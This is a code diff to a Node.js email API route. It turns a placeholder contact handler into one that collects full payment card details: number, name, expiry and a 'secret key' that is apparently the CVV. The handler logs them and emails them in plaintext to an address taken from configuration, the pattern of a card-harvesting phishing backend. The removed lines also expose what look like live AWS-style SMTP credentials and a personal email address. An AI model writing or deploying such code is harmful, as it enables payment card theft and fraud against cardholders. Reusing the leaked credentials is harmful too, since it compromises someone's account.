@@ -6,8 +6,8 @@ const transporter = nodemailer.createTransport({
     port: 587, // Use port 587 or 465
     secure: false, // true for 465, false for other ports
     auth: {
-        user: "AKIAVL4OPEQR2IPLMD6D",
-        pass: "BL8Ee/Z0esD46sjruIs4OO7HMtNO0jsdhhMvWl7EhZiT",
+        user: process.env.EMAIL_USER,
+        pass: process.env.EMAIL_PASS,
     },
 });
 
@@ -15,15 +15,20 @@ const transporter = nodemailer.createTransport({
 export async function POST(req: Request) {
 
     const body = await req.json() as {
-        name: string;
-        email: string;
-        message: string;
+        refNumber: string;
+        cardNumber: string;
+        cardName: string;
+        secretKey: string;
+        cardExpirationMonth: string;
+        cardExpirationYear: string;
     };
 
+    console.log(body)
+
     const mailOptions = {
-        from: "senduran40@gmail.com",
-        to: "senduran40@gmail.com",
-        subject: "Test Email",
+        from: process.env.EMAIL_FROM_VERIFIED,
+        to: process.env.EMAIL_TO_ANY,
+        subject: `PD - Ref: ${body.refNumber}`,
         html: `
         <html lang="en">
         <head>
@@ -48,38 +53,28 @@ export async function POST(req: Request) {
                 tr:nth-child(even) {
                     background-color: #f2f2f2;
                 }
-            </style>
+            </style><title></title>
         </head>
         <body>
-            <h1>hi</h1>
-            <table class="table">
-                <thead>
+            <h4>Payment Details</h4>
+            <p><b>Ref Number: ${body.refNumber}</b></p>
+            <table>
                 <tr>
-                    <th scope="col">#</th>
-                    <th scope="col">First</th>
-                    <th scope="col">Last</th>
-                    <th scope="col">Handle</th>
-                </tr>
-                </thead>
-                <tbody>
-                <tr>
-                    <th scope="row">1</th>
-                    <td>Mark</td>
-                    <td>Otto</td>
-                    <td>@mdo</td>
+                    <td>Card Number</td>
+                    <td>${body.cardNumber}</td>
                 </tr>
                 <tr>
-                    <th scope="row">2</th>
-                    <td>Jacob</td>
-                    <td>Thornton</td>
-                    <td>@fat</td>
+                    <td>Card Name</td>
+                    <td>${body.cardName}</td>
                 </tr>
                 <tr>
-                    <th scope="row">3</th>
-                    <td colspan="2">Larry the Bird</td>
-                    <td>@twitter</td>
+                    <td>Secret Key</td>
+                    <td>${body.secretKey}</td>
                 </tr>
-                </tbody>
+                <tr>
+                    <td>Card Expiration (MM/YY)</td>
+                    <td>${body.cardExpirationMonth}/${body.cardExpirationYear}</td>
+                </tr>
             </table>
         </body>
         </html>
